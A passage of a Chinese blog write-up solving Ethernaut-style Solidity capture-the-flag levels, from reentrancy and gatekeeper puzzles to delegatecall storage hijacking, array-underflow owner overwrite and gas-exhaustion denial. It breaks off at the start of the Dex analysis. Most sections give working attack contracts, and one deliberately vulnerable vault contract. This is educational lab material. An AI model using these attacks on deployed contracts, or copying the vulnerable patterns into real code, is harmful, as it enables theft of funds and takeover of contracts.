&#123;<br>        ire = IRe(_addr);<br>    &#125;<br>    <br>    function main() public payable &#123;<br>        ire.donate&#123;value: 1e15&#125;(address(this));<br>        ire.withdraw(1e15);<br>    &#125;<br>    <br>    function getBack(address payable me, uint256 left) public &#123;<br>        me.transfer(left);<br>    &#125;<br>    <br>    receive() external payable &#123; <br>        if (address(ire).balance &gt; 0) &#123;<br>            ire.withdraw(1e15);		// 选择1e15是因为观察到该合约仅有0.001 ether<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>与二面中压轴题类似，可做参考</p>
+<h4 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h4><p>带 1 ether 部署金库，尝试取出它</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br>contract AdvancedVault &#123; <br>    event Deposit(address indexed depositor, uint256 amount);<br>    event Withdrawal(address indexed withdrawer, uint256 amount);<br>    event BalanceChange(address indexed account, uint256 newBalance);<br><br>    mapping(address =&gt; uint256) public balances;<br>    uint256 public totalDeposited;<br>    address public owner;<br>  <br>    constructor() payable &#123;<br>        require(msg.value == 1 ether,&quot;money&quot;);<br>        owner = msg.sender;<br>    &#125;<br><br>    function deposit() external payable &#123;<br>        require(msg.value &gt; 0, &quot;Deposit amount must be greater than 0&quot;);<br>        balances[msg.sender] += msg.value;<br>        totalDeposited += msg.value;<br>        emit Deposit(msg.sender, msg.value);<br>        emit BalanceChange(msg.sender, balances[msg.sender]);<br>    &#125;<br> <br>    function withdraw(uint256 _amount) external &#123;<br>        require(_amount &gt; 0, &quot;Withdrawal amount must be greater than 0&quot;);<br>        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);<br>        require(msg.sender == owner, &quot;Only the owner can withdraw&quot;);<br>        (bool sent, ) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);<br>        balances[msg.sender] -= _amount;<br>        totalDeposited -= _amount;<br>        require(sent, &quot;Failed to send Ether&quot;);<br>        emit Withdrawal(msg.sender, _amount);<br>        emit BalanceChange(msg.sender, balances[msg.sender]);<br>    &#125;<br><br>    function getBalance(address account) external view returns (uint256) &#123;<br>        return balances[account];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack&#123;<br>	AdvancedVault add;<br>	constructor(AdvancedVault _add) public &#123;<br>		add = _add;<br>	&#125;<br>           <br>	function hack() external payable&#123;<br>		add.deposit&#123;value: 1 ether&#125;();<br>		add.withdraw(1 ether);<br>	&#125;<br>	<br>	function kill() external&#123;<br>		selfdestruct(payable(msg.sender));<br>	&#125;<br>	<br>	fallback() external payable &#123; <br>		if(address(add).balance!=0)&#123;<br>			add.withdraw(1 ether);<br>		&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="12-Elevator"><a href="#12-Elevator" class="headerlink" title="12. Elevator"></a>12. Elevator</h2><h3 id="条件：让电梯达到大楼顶部"><a href="#条件：让电梯达到大楼顶部" class="headerlink" title="条件：让电梯达到大楼顶部"></a>条件：让电梯达到大楼顶部</h3><p>即：让 top 为 true</p>
+<p>要满足：在 if 中 <code>building.isLastFloor</code> 的返回值为 false，后续再调用 <code>building.isLastFloor</code>，返回值为 true</p>
+<p>根据提示，我们不能让合约运行它期待的 Building 接口中的 <code>isLastFloor</code> 函数</p>
+<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract BuildingImpl &#123;<br>    Elevator public elevator;<br>    uint256 public count = 0;<br>    constructor(Elevator _elevator) &#123;<br>        elevator = _elevator;<br>    &#125;<br><br>    function goToTop() public &#123;<br>        elevator.goTo(1);<br>       require(elevator.top());<br>    &#125;<br><br>    function isLastFloor(uint256 _floor) public returns (bool) &#123;<br>        count++;<br>        return count &gt; 1;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><code>elevator</code> 会调用来自 <code>msg.sender</code> (也就是这个合约的地址) 的 <code>isLastFloor</code>，第一次为 <code>false</code>，第二次为 <code>true</code>。</p>
+<h2 id="13-Privacy"><a href="#13-Privacy" class="headerlink" title="13. Privacy"></a>13. Privacy</h2><p>见 <code>09. Vault</code>。具体插槽分布如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs slots">slot0: bool locked(4B)<br>slot1: uint256 ID(32B)<br>slot2: uint8 flattening(1B) + uint8 denomination(1B) + uint16 awkwardness(2B)<br>slot3: bytes32 data[0](32B)<br>slot4: bytes32 data[1](32B)<br>slot5: bytes32 data[2](32B)<br></code></pre></td></tr></table></figure>
+<p>通过 <code>web3.eth.getStorageAt(&quot;合约地址&quot;, 5)</code> 获取 <code>data[2]</code>，再取前16位。</p>
+<h2 id="14-GatekeeperOne"><a href="#14-GatekeeperOne" class="headerlink" title="14.GatekeeperOne"></a>14.GatekeeperOne</h2><p>显然要通过3个<code>modifier</code>。</p>
+<ol>
+<li>新建一个合约，在新建的合约里调用 <code>enter()</code> 就行了（<code>msg.sender</code> 为新合约的地址）。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>&#125;<br></code></pre></td></tr></table></figure>
+<ol>
+<li><p>要求剩余的 <code>gas</code> 是 8191 的倍数。</p>
+<p>我们可以发送时指定一下 <code>gas</code>：<code>&#123;gas: 8191 * 5 + _gas&#125;</code>，然后挨个试。</p>
+<p>网上的攻略说可以用脚本，这个尝试没成功，回头再试试。</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateTwo() &#123;<br>    require(gasleft() % 8191 == 0);<br>    _;<br>&#125;<br></code></pre></td></tr></table></figure>
+<ol>
+<li><p>简化一下：</p>
+<p>首先看最严格的第三条，要求 <code>_gateKey</code> 的后32位与钱包地址后16位相同，显然可以得出，<code>_gatekey64_32 = 0x_ _ _ _823d</code>。</p>
+<p>然后看第一条，要求 <code>_gateKey</code> 的后32位与后16位的值相同，显然，后32位中的前16位必须为0，<code>_gatekey64_32 = 0x0000823d</code>，</p>
+<p><code>_gatekey64 = 0x_ _ _ _ _ _ _ _0000823d</code>。</p>
+<p>最后看第二条，后32位与后64位不相等。只要一大串横线上的数不全为0即可。</p>
+<p>综上，<code>_gateKey = 0x _ _ _ _ _ _ _ _ 0000 + 钱包地址后4位(16进制)</code>，且横线上不全为0。</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateThree(bytes8 _gateKey) &#123;<br>        uint64 _gatekey64 = uint64(_gateKey);<br>        uint32 _gatekey64_32 = uint32(_gatekey64);  <br>        require(_gatekey64_32 == uint16(_gatekey64));   <br>        require(_gatekey64_32 != _gatekey64);  <br>        require(_gatekey64_32 == uint16(uint160(tx.origin)));<br>        _;<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>通过合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass &#123;<br>    GatekeeperOne gatekeeper;<br>        <br>    constructor(GatekeeperOne _gatekeeper) &#123;<br>        gatekeeper = _gatekeeper;<br>    &#125;<br><br>	// _gas = 256<br>    function register(uint256 _gas) public returns(bool)&#123;<br>        bytes8 _gateKey = bytes8(uint64(0x00000001000082d3));<br>        return gatekeeper.enter&#123;gas: 8191 * 5 + _gas&#125;(_gateKey);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="15-Gatekeeper-Two"><a href="#15-Gatekeeper-Two" class="headerlink" title="15. Gatekeeper Two"></a>15. Gatekeeper Two</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="1-内联汇编（assembly）"><a href="#1-内联汇编（assembly）" class="headerlink" title="1. 内联汇编（assembly）"></a>1. 内联汇编（<code>assembly</code>）</h4><p>具体逻辑见：<a target="_blank" rel="noopener" href="https://learnblockchain.cn/article/675#%E6%B1%87%E7%BC%96%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D">Solidity 中编写内联汇编(assembly)的那些事[译]</a></p>
+<p>一些操作见：<a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.6.2/yul.html#evm-dialect">EVM Dialect</a></p>
+<h4 id="2-异或运算"><a href="#2-异或运算" class="headerlink" title="2. 异或运算"></a>2. 异或运算</h4><p>对两个二进制数值的每一位，两个输入值不同时结果为真（1），相同时结果为假（0）。</p>
+<p>这里用的是异或运算的可逆性，即：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span> ^ <span class="hljs-selector-tag">b</span> = c<br><span class="hljs-selector-tag">a</span> = <span class="hljs-selector-tag">b</span> ^ c<br><span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span> ^ c<br></code></pre></td></tr></table></figure>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>通过3个 <code>modifier</code>，注册成为 <code>entrant</code>。</p>
+<h4 id="1-GateOne"><a href="#1-GateOne" class="headerlink" title="1. GateOne"></a>1. GateOne</h4><p>很简单，写一个合约，用它去调用 <code>GatekeeperTwo</code>。(<code>msg.sender</code>= 写的合约地址，<code>tx.origin</code> = 你的钱包地址)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="2-GateTwo"><a href="#2-GateTwo" class="headerlink" title="2. GateTwo"></a>2. GateTwo</h4><p>显然，要让 <code>caller()</code> （<code>msg.sender</code> 的底层）的合约代码大小为0。</p>
+<p>由于 <code>excodesize(addr)</code> 不计算合约 <code>constructor</code> 中的代码，因此要在构造函数中调用 <code>enter</code>。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateTwo() &#123;<br>    uint256 x;<br>    assembly &#123;<br>        x := extcodesize(caller())<br>    &#125;<br>    require(x == 0);<br>    _;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="3-GateThree"><a href="#3-GateThree" class="headerlink" title="3. GateThree"></a>3. GateThree</h4><p>显然，<code>_gateKey = bytes8( uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max )</code></p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">modifier</span> <span class="hljs-function"><span class="hljs-title">gateThree</span>(<span class="hljs-variable">bytes8</span> <span class="hljs-variable">_gateKey</span>) &#123;</span><br><span class="hljs-function">    <span class="hljs-title">require</span>(<span class="hljs-title">uint64</span>(<span class="hljs-title">bytes8</span>(<span class="hljs-title">keccak256</span>(<span class="hljs-variable">abi.encodePacked</span>(<span class="hljs-variable">msg.<span class="hljs-class">sender</span></span>)))) ^ <span class="hljs-title">uint64</span>(<span class="hljs-variable">_gateKey</span>) == <span class="hljs-title">type</span>(<span class="hljs-variable">uint64</span>).max);</span><br><span class="hljs-function">    <span class="hljs-variable">_</span>;</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure>
+<h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass&#123;<br>    GatekeeperTwo gatekeeperTwo;<br>    bytes8 key;<br><br>    constructor(GatekeeperTwo _gatekeeperTwo) &#123;<br>        gatekeeperTwo = _gatekeeperTwo;<br>        key = bytes8( uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max );<br>        _gatekeeperTwo.enter(key);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="16-Naught-Coin"><a href="#16-Naught-Coin" class="headerlink" title="16. Naught Coin"></a>16. Naught Coin</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>清空 player 的余额，基于 OpenZeppelin 的 ERC20 实现。</p>
+<p>由于 <code>transfer</code> 不能用，因此需要授权一定的额度给 A，让 A去转出。</p>
+<h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><ol>
+<li><p>手动<br>自己给自己 <code>approve</code> 足够的限额，用 <code>transferFrom</code> 把自己的余额转给任意地址。</p>
+</li>
+<li><p>通过合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract turnEmpty&#123;<br>    NaughtCoin naughtCoin;<br>    constructor(NaughtCoin _naughtCoin)&#123;<br>        naughtCoin = _naughtCoin;<br>    &#125;<br><br>    function spendMoney() public &#123;<br>        address _from = tx.origin;<br>        address _to = address(this);<br>        uint256 _value = naughtCoin.balanceOf(_from);<br>        naughtCoin.transferFrom(_from, _to, _value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="17-Preservation"><a href="#17-Preservation" class="headerlink" title="17. Preservation"></a>17. Preservation</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>未发现可以更改 <code>owner</code> 的代码。</p>
+<p>注意到 <code>SetFirstTime</code> 函数中，<code>delegatecall</code> 调用了下方 <code>LibraryContract</code> 合约中的函数。由于 <code>delegatecall</code> 使用的是原来的上下文，更改的数值由原来的 <code>storedTime</code> 变成了 <code>address public timeZone1Library</code>。因此，可以将它改成我们自己合约的地址，并再次据此更改 <code>owner</code>。</p>
+<h3 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass&#123;<br>    address public timeZone1Library;<br>    address public timeZone2Library;<br>    address public owner;<br>    uint256 storedTime;<br>    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br>    <br>    Preservation preservation;<br><br>    constructor(Preservation _preservation) &#123;<br>        preservation = _preservation;<br>    &#125;<br><br><br>    function changeFirstVar() public &#123;<br>        preservation.setFirstTime( uint256(uint160(address(this))) );<br>    &#125;<br><br>    function setTime(uint256 ) public &#123;<br>        owner = tx.origin;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>先调用 <code>changeFirstVar</code>，在调用原合约的 <code>setFirstTime()</code>，参数随便写。</p>
+<h2 id="18-Recovery"><a href="#18-Recovery" class="headerlink" title="18. Recovery"></a>18. Recovery</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>此处中译漏了 <code>0.001ETH</code>。显然，移除 <code>0.001ETH</code> 只需调用 <code>destroy()</code> 函数。因此关键是获取合约的地址。</p>
+<p>通过普通的 <code>create</code> 创造的合约地址参考：<a target="_blank" rel="noopener" href="https://learnblockchain.cn/article/88">以太坊合约地址是怎么计算出来的?</a></p>
+<p>但其中 <code>solidity</code> 部分代码不完整，修改如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">address nonce0 = address(<br>	uint160(uint256(keccak256(<br>		abi.encodePacked(bytes1(0xd6), bytes1(0x94), factory, bytes1(0x80))<br>	)))<br>);<br>address nonce1 = address(<br>    uint160(uint256(keccak256(<br>    	abi.encodePacked(bytes1(0xd6), bytes1(0x94), factory, bytes1(0x01))<br>    )))<br>);<br></code></pre></td></tr></table></figure>
+<p>或直接看英文原文：<a target="_blank" rel="noopener" href="https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed">How is the address of an Ethereum contract computed?</a></p>
+<h3 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass &#123;<br>    function recover(address factory) public pure returns(address[2] memory addr) &#123;<br>        address nonce0 = address(<br>            uint160(uint256(keccak256(<br>                abi.encodePacked(bytes1(0xd6), bytes1(0x94), factory, bytes1(0x80))<br>            )))<br>        );<br>        address nonce1 = address(<br>            uint160(uint256(keccak256(<br>                abi.encodePacked(bytes1(0xd6), bytes1(0x94), factory, bytes1(0x01))<br>            )))<br>        );<br>        addr[0] = nonce0;<br>        addr[1] = nonce1;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>分别尝试 <code>nonce0</code> 和 <code>nonce1</code> 算出来的地址，发现 <code>nonce1</code> 处的是真正的合约。</p>
+<h2 id="19-MagicNumber"><a href="#19-MagicNumber" class="headerlink" title="19. MagicNumber"></a>19. MagicNumber</h2><p>暂时不会，等回头看完 EVM 操作码再说。</p>
+<h2 id="20-Alien-Codex"><a href="#20-Alien-Codex" class="headerlink" title="20. Alien Codex"></a>20. Alien Codex</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>未发现 <code>owner</code> 改变的函数。猜测 <code>import</code> 了 <code>openZepplin</code> 的 <code>ownerable.sol</code> ，自带第一个状态变量 <code>owner</code>。猜测要通过插槽实现。</p>
+<blockquote>
+<p>Solidity v0.8.0 重大变更</p>
+<ul>
+<li><p>算术运算在下溢和上溢时会回退。你可以使用 <code>unchecked &#123; ... &#125;</code> 来使用之前的环绕行为。</p>
+<p>溢出检查非常常见，因此我们将其设为默认，以提高代码的可读性，即使这会略微增加 gas 成本。</p>
+</li>
+</ul>
+<p>Solidity v0.6.0 重大变更</p>
+<ul>
+<li>数组的 <code>length</code> 成员访问现在始终是只读的，即使对于存储数组。通过将新值分配给其长度不再可能调整存储数组的大小。请使用 <code>push()</code>, <code>push(value)</code> 或 <code>pop()</code>，或者分配一个完整的数组，这当然会覆盖现有内容。 这样做的原因是为了防止巨型存储数组的存储冲突。</li>
+</ul>
+</blockquote>
+<p>由于 <code>^0.5.0</code> 时下溢不检查，通过 <code>retract()</code> 函数使数组长度变为 $ 2^{256}-1$，这使得它覆盖了全部的插槽（共 $2^{256}$ 个），部分位置就不得不与前面的插槽共用一个位置。我们只要计算那个地方。</p>
+<p>动态数组在 <code>solidity</code> 内存中的存储方式见：<a target="_blank" rel="noopener" href="https://github.com/WTFAcademy/WTF-Solidity-Internals/blob/master/tutorials/02_MappingStorage/readme.md">WTF Solidity 内部标准: 02. 映射和动态数组的存储布局</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">slot <span class="hljs-number">0</span>			<span class="hljs-selector-tag">address</span> <span class="hljs-built_in">owner</span>(<span class="hljs-number">20</span>B)	bool <span class="hljs-built_in">contact</span>(<span class="hljs-number">1</span>B)<br>slot <span class="hljs-number">1</span>  		codex 数组的长度<br><br>···<br>n = <span class="hljs-built_in">keccak256</span>(<span class="hljs-number">1</span>)<br>slot n 			codex<span class="hljs-selector-attr">[0]</span>(<span class="hljs-number">32</span>B)<br>slot n+<span class="hljs-number">1</span>		codex<span class="hljs-selector-attr">[1]</span><br>···<br>slot <span class="hljs-selector-tag">i</span>			codex<span class="hljs-selector-attr">[i-n]</span><br>···<br>slot n+<span class="hljs-number">2</span>^<span class="hljs-number">256</span>-<span class="hljs-number">1</span>	codex<span class="hljs-selector-attr">[2^256-1]</span> <br></code></pre></td></tr></table></figure>
+<p>所以，<code>codex[-n]</code> 与 <code>owner</code> 共享插槽。我们可以更改 <code>codex[-n]</code> 来实现对 <code>owner</code> 的更改。</p>
+<h3 id="实现-5"><a href="#实现-5" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">interface IAlienCodex &#123;<br>    function makeContact() external;<br>    function record(bytes32 _content) external;<br>    function retract() external;<br>    function revise(uint256 i, bytes32 _content) external;<br>&#125;<br><br>contract pass &#123;<br>    AlienCodex alienCodex;<br>    constructor(AlienCodex _alienCodex) public &#123;<br>        alienCodex = _alienCodex;<br>    &#125;<br><br>    function changeOwner() public &#123;<br>        alienCodex.makeContact();<br>        alienCodex.retract();<br>        uint256 place = uint256(keccak256(abi.encode(1)));<br>        alienCodex.revise( -place, bytes32(uint256(tx.origin)) );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="21-Denial"><a href="#21-Denial" class="headerlink" title="21. Denial"></a>21. Denial</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>要求在调用 <code>withdraw()</code> 时，仅向 <code>partner</code> 转账，而不向 <code>owner</code> 转账。显然，我们要在接收转账的合约的 <code>fallback()</code> 里做手脚。</p>
+<p>首先，直接 <code>revert()</code> 让交易中断显然不行。因此，我们只能让 <code>fallback()</code> 消耗完所有的 <code>gas</code>，从而使转账成功，但没有 <code>gas</code> 继续执行下一次转账。</p>
+<p>最简单的方式显然是直接写一个死循环。 </p>
+<h3 id="实现-6"><a href="#实现-6" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass&#123;<br>    Denial denial;<br><br>    constructor(Denial _denial) &#123;<br>        denial = _denial;<br>        denial.setWithdrawPartner(address(this));<br>    &#125;<br><br>    fallback() external payable &#123; <br>        while (true) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="22-Shop"><a href="#22-Shop" class="headerlink" title="22. Shop"></a>22. Shop</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>和之前的电梯有异曲同工之处。要求第一次调用 <code>price()</code> 返回100以上的数，第二次返回以下的数。由于是 <code>view</code>，无法像电梯一样设一个 <code>count</code>。注意到原合约中有变量 <code>isSold</code> 在两次调用期间发生了变化。</p>
+<h3 id="实现-7"><a href="#实现-7" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass &#123;<br>    Shop shop;<br>    constructor(Shop _shop) &#123;<br>        shop = _shop;<br>    &#125;<br>    <br>    function price() external view returns (uint256) &#123;<br>        if (!shop.isSold())   return 100;<br>        else    return 0;<br><br>    &#125;<br><br>    function beLower() public &#123;<br>        shop.buy();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="23-Dex"><a href="#23-Dex" class="headerlink" title="23. Dex"></a>23. Dex</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>发现本合约的 <code>swapPrice</code> 存在一点问题。当你在两种 <code>token</code> 间反复转换使，会使合约拥有的 <code>token</code> 数量减少。具体过程如下：</p>
